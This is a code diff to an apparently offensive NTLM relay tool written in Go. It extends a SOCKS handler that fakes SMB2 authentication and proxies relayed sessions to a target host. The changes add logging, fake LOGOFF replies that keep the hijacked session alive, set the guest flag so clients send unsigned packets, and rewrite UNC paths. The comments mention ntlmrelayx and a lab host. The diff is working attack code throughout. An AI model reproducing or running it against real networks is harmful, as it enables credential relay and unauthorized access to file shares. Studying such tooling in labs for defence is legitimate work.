@@ -273,9 +273,11 @@ func socks5Handshake(c net.Conn) (net.IP, int, error) {
 // injectSession runs the fake SMB2 authenticate dance then proxies raw
 // SMB2 packets, rewriting MessageId and SessionId on the fly.
 func injectSession(client net.Conn, sess *RelaySession) {
+	caddr := client.RemoteAddr().String()
 	// ── Phase 1: fake NEGOTIATE + SESSION_SETUP ───────────────────────────
 	first, err := recvNB(client)
 	if err != nil {
+		core.LogVerbose("[SOCKS] %s phase1 read first: %v", caddr, err)
 		return
 	}
 
@@ -283,18 +285,22 @@ func injectSession(client net.Conn, sess *RelaySession) {
 	if isSMB1(first) {
 		realResp := targetNegotiateResp(sess.TargetIP, 0)
 		if err := sendNB(client, realResp); err != nil {
+			core.LogVerbose("[SOCKS] %s phase1 send SMB1 upgrade: %v", caddr, err)
 			return
 		}
 		first, err = recvNB(client)
 		if err != nil {
+			core.LogVerbose("[SOCKS] %s phase1 read after SMB1 upgrade: %v", caddr, err)
 			return
 		}
 	}
 
 	if !isSMB2(first) || len(first) < 64 {
+		core.LogVerbose("[SOCKS] %s phase1 not SMB2 (len=%d)", caddr, len(first))
 		return
 	}
 	cmd := binary.LittleEndian.Uint16(first[12:14])
+	core.LogVerbose("[SOCKS] %s phase1 cmd=0x%04X", caddr, cmd)
 
 	// SMB2 NEGOTIATE → relay target's real response so the client sees the
 	// correct machine name, domain, capabilities and signing policy.
@@ -302,40 +308,53 @@ func injectSession(client net.Conn, sess *RelaySession) {
 		negMsgID := binary.LittleEndian.Uint64(first[24:32])
 		realResp := targetNegotiateResp(sess.TargetIP, negMsgID)
 		if err := sendNB(client, realResp); err != nil {
+			core.LogVerbose("[SOCKS] %s phase1 send NEGOTIATE resp: %v", caddr, err)
 			return
 		}
 		first, err = recvNB(client)
 		if err != nil {
+			core.LogVerbose("[SOCKS] %s phase1 read after NEGOTIATE: %v", caddr, err)
 			return
 		}
 		if !isSMB2(first) || len(first) < 64 {
+			core.LogVerbose("[SOCKS] %s phase1 not SMB2 after NEGOTIATE (len=%d)", caddr, len(first))
 			return
 		}
 		cmd = binary.LittleEndian.Uint16(first[12:14])
+		core.LogVerbose("[SOCKS] %s phase1 post-NEGOTIATE cmd=0x%04X", caddr, cmd)
 	}
 
 	if cmd != 0x0001 { // must be SESSION_SETUP
+		core.LogVerbose("[SOCKS] %s phase1 expected SESSION_SETUP got cmd=0x%04X — done", caddr, cmd)
 		return
 	}
 
-	// SESSION_SETUP Type 1 → send fake NTLM challenge
+	// SESSION_SETUP Type 1 → send fake NTLM challenge.
+	// Use "WORKGROUP" (not a DNS domain name) so that nxc/smbclient treat the
+	// target as a standalone server and connect to IPC$ directly for share
+	// enumeration rather than attempting SYSVOL/NETLOGON (DC-only shares).
 	setup1MsgID := binary.LittleEndian.Uint64(first[24:32])
 	challenge := core.GetChallenge()
-	ntlmChal := core.BuildNTLMChallenge(challenge, core.SessionDomain, core.SessionMachineName)
+	ntlmChal := core.BuildNTLMChallenge(challenge, "WORKGROUP", core.SessionMachineName)
 	spnego := core.WrapSPNEGOChallenge(ntlmChal)
 	if err := sendNB(client, buildSocksChallenge(setup1MsgID, spnego)); err != nil {
+		core.LogVerbose("[SOCKS] %s phase1 send challenge: %v", caddr, err)
 		return
 	}
+	core.LogVerbose("[SOCKS] %s phase1 challenge sent — waiting TYPE3", caddr)
 
 	// SESSION_SETUP Type 3 → ignore content, reply with SUCCESS + real sessionID
 	type3, err := recvNB(client)
 	if err != nil {
+		core.LogVerbose("[SOCKS] %s phase1 read TYPE3: %v", caddr, err)
 		return
 	}
 	if !isSMB2(type3) || len(type3) < 64 {
+		core.LogVerbose("[SOCKS] %s phase1 TYPE3 not SMB2 (len=%d)", caddr, len(type3))
 		return
 	}
 	if binary.LittleEndian.Uint16(type3[12:14]) != 0x0001 {
+		core.LogVerbose("[SOCKS] %s phase1 TYPE3 unexpected cmd=0x%04X", caddr, binary.LittleEndian.Uint16(type3[12:14]))
 		return
 	}
 	setup3MsgID := binary.LittleEndian.Uint64(type3[24:32])
@@ -345,14 +364,16 @@ func injectSession(client net.Conn, sess *RelaySession) {
 	sess.mu.Unlock()
 
 	if err := sendNB(client, buildSocksSuccess(setup3MsgID, realSessionID)); err != nil {
+		core.LogVerbose("[SOCKS] %s phase1 send success: %v", caddr, err)
 		return
 	}
-	core.LogVerbose("[SOCKS] session #%d auth injected — proxying", sess.ID)
+	core.LogVerbose("[SOCKS] session #%d auth injected (%s) — proxying", sess.ID, caddr)
 
 	// ── Phase 2: proxy loop ───────────────────────────────────────────────
 	for {
 		req, err := recvNB(client)
 		if err != nil {
+			core.LogVerbose("[SOCKS] session #%d client recv: %v", sess.ID, err)
 			return
 		}
 		if !isSMB2(req) || len(req) < 64 {
@@ -361,21 +382,42 @@ func injectSession(client net.Conn, sess *RelaySession) {
 
 		reqCmd := binary.LittleEndian.Uint16(req[12:14])
 		clientMsgID := binary.LittleEndian.Uint64(req[24:32])
+		core.LogVerbose("[SOCKS] session #%d → cmd=0x%04X clientMsgID=%d len=%d",
+			sess.ID, reqCmd, clientMsgID, len(req))
 
-		// LOGOFF: clean up gracefully
+		// TREE_CONNECT (0x0003): rewrite the UNC path so the server name
+		// matches the target IP.  nxc/smbclient derive the server name from
+		// our NTLMSSP challenge (fake) and embed it in the path; CASTELBLACK
+		// rejects with STATUS_BAD_NETWORK_NAME if it sees our made-up name.
+		if reqCmd == 0x0003 {
+			req = rewriteTreeConnectPath(req, sess.TargetIP)
+		}
+
+		// LOGOFF from the SOCKS client: send a fake success response but
+		// keep the connection open and continue the proxy loop.
+		//
+		// nxc's enum_host_info() sends LOGOFF at the end of its probe phase,
+		// then immediately calls shares() on the same TCP connection.  If we
+		// close the TCP connection here (or even just return), the subsequent
+		// IPC$ TREE_CONNECT that shares() sends dies on a closed socket and
+		// nxc reports "Error while reading from remote".
+		//
+		// We also MUST NOT forward the LOGOFF to the relay target; doing so
+		// would terminate the authenticated session on CASTELBLACK and break
+		// every future SOCKS client on this session.
 		if reqCmd == 0x0002 {
-			sess.mu.Lock()
-			close(sess.stop)
-			sess.conn.close()
-			sess.mu.Unlock()
-			Pool.Remove(sess)
 			sendNB(client, buildLogoffResp(clientMsgID))
-			core.LogInfo("[SOCKS] session #%d terminated (logoff)", sess.ID)
-			return
+			core.LogVerbose("[SOCKS] session #%d LOGOFF intercepted — faking success, keeping connection open", sess.ID)
+			continue
 		}
 
 		sess.mu.Lock()
-		targetMsgID := sess.conn.nextMsgID()
+		// Advance the relay msgID counter by CreditCharge (bytes [6:8]).
+		// A request with CreditCharge=N consumes msgIDs [M, M+N-1] on the
+		// server, so the next request must use M+N.  Failing to account for
+		// this causes CASTELBLACK to RST on the request after a large READ.
+		creditCharge := binary.LittleEndian.Uint16(req[6:8])
+		targetMsgID := sess.conn.consumeMsgIDs(creditCharge)
 		// Rewrite MessageId and SessionId so the target accepts the packet.
 		binary.LittleEndian.PutUint64(req[24:32], targetMsgID)
 		binary.LittleEndian.PutUint64(req[40:48], sess.SessionID)
@@ -398,9 +440,14 @@ func injectSession(client net.Conn, sess *RelaySession) {
 		sess.mu.Unlock()
 
 		if sendErr != nil || err != nil {
-			core.LogVerbose("[SOCKS] session #%d target I/O error", sess.ID)
+			core.LogVerbose("[SOCKS] session #%d target I/O error (send=%v recv=%v)", sess.ID, sendErr, err)
 			return
 		}
+
+		respStatus := smb2Status(resp)
+		respCmd := binary.LittleEndian.Uint16(resp[12:14])
+		core.LogVerbose("[SOCKS] session #%d ← cmd=0x%04X status=0x%08X len=%d",
+			sess.ID, respCmd, respStatus, len(resp))
 
 		// Rewrite MessageId in response to match what the client expects.
 		if len(resp) >= 64 {
@@ -441,15 +488,25 @@ func buildSocksChallenge(msgID uint64, spnego []byte) []byte {
 }
 
 // buildSocksSuccess sends SESSION_SETUP STATUS_SUCCESS with the real sessionID.
-// After this the client uses realSessionID in all subsequent requests, which is
-// exactly what we need — no rewriting in the proxy loop.
+//
+// Two details matter here (learned from ntlmrelayx's socksplugins/smb.py):
+//
+//  1. SessionFlags = 0x0001 (IS_GUEST) — without this, smbclient/Samba refuse to
+//     send unsigned packets even when the server didn't require signing.
+//
+//  2. The security buffer must contain a SPNEGO NegTokenResp with NegState =
+//     accept-completed (0x00).  An empty buffer makes impacket think the auth
+//     exchange is still in progress and it sends another SESSION_SETUP.
 func buildSocksSuccess(msgID, sessionID uint64) []byte {
+	spnego := core.WrapSPNEGOSuccess()
 	hdr := smb2RespHdr(0x0001, msgID, smb2StatusSuccess, sessionID)
+	secBufOff := uint16(64 + 8)
 	var body []byte
-	body = binary.LittleEndian.AppendUint16(body, 9)    // StructureSize
-	body = binary.LittleEndian.AppendUint16(body, 0)    // SessionFlags
-	body = binary.LittleEndian.AppendUint16(body, 64+8) // SecurityBufferOffset
-	body = binary.LittleEndian.AppendUint16(body, 0)    // SecurityBufferLength (empty)
+	body = binary.LittleEndian.AppendUint16(body, 9)                // StructureSize
+	body = binary.LittleEndian.AppendUint16(body, 0x0001)           // SessionFlags = IS_GUEST
+	body = binary.LittleEndian.AppendUint16(body, secBufOff)        // SecurityBufferOffset
+	body = binary.LittleEndian.AppendUint16(body, uint16(len(spnego))) // SecurityBufferLength
+	body = append(body, spnego...)
 	return append(hdr, body...)
 }
 
@@ -457,6 +514,72 @@ func buildSocksSuccess(msgID, sessionID uint64) []byte {
 func buildLogoffResp(msgID uint64) []byte {
 	hdr := smb2RespHdr(0x0002, msgID, smb2StatusSuccess, 0)
 	return append(hdr, 0x04, 0x00) // StructureSize = 4
+}
+
+// rewriteTreeConnectPath rewrites the UNC server name in an SMB2 TREE_CONNECT
+// request body to targetIP so CASTELBLACK accepts the path.
+//
+// nxc/smbclient use the server name from our NTLMSSP CHALLENGE AvPairs as the
+// UNC server — e.g. \\WIN-FAKE\IPC$ — which CASTELBLACK rejects because it
+// doesn't know that hostname.  We replace the server name portion with the
+// target IP so the path becomes \\192.168.62.22\IPC$.
+//
+// TREE_CONNECT body layout (relative to message start):
+//
+//	hdr(64) + StructureSize(2) + Flags(2) + PathOffset(2) + PathLength(2) + Path(UTF-16LE)
+func rewriteTreeConnectPath(req []byte, targetIP net.IP) []byte {
+	if len(req) < 64+8 {
+		return req
+	}
+	body := req[64:]
+	pathOff := int(binary.LittleEndian.Uint16(body[4:6]))
+	pathLen := int(binary.LittleEndian.Uint16(body[6:8]))
+	if pathOff+pathLen > len(req) || pathLen < 4 {
+		return req
+	}
+	pathBytes := req[pathOff : pathOff+pathLen]
+
+	// Decode UTF-16LE path
+	path := make([]byte, pathLen/2)
+	for i := range path {
+		path[i] = pathBytes[i*2]
+	}
+	s := string(path) // ASCII subset only — UNC paths are ASCII
+	core.LogVerbose("[SOCKS] TREE_CONNECT path=%q pathOff=%d pathLen=%d", s, pathOff, pathLen)
+
+	// Find the share name: "\\SERVER\SHARE" → SERVER, SHARE
+	if len(s) < 3 || s[0] != '\\' || s[1] != '\\' {
+		core.LogVerbose("[SOCKS] TREE_CONNECT path does not start with \\\\, skipping rewrite")
+		return req
+	}
+	rest := s[2:]
+	slashIdx := -1
+	for i, c := range rest {
+		if c == '\\' {
+			slashIdx = i
+			break
+		}
+	}
+	if slashIdx < 0 {
+		return req
+	}
+	share := rest[slashIdx:] // "\SHARE"
+	newPath := "\\\\" + targetIP.String() + share
+	core.LogVerbose("[SOCKS] TREE_CONNECT rewrite: %q → %q", s, newPath)
+
+	// Re-encode as UTF-16LE
+	newPathBytes := make([]byte, len(newPath)*2)
+	for i, c := range newPath {
+		newPathBytes[i*2] = byte(c)
+		newPathBytes[i*2+1] = 0
+	}
+
+	// Rebuild the request with the new path
+	newReq := make([]byte, pathOff+len(newPathBytes))
+	copy(newReq, req[:pathOff])
+	copy(newReq[pathOff:], newPathBytes)
+	binary.LittleEndian.PutUint16(newReq[64+6:], uint16(len(newPathBytes)))
+	return newReq
 }
 
 // targetNegotiateResp opens a short-lived probe connection to the target,
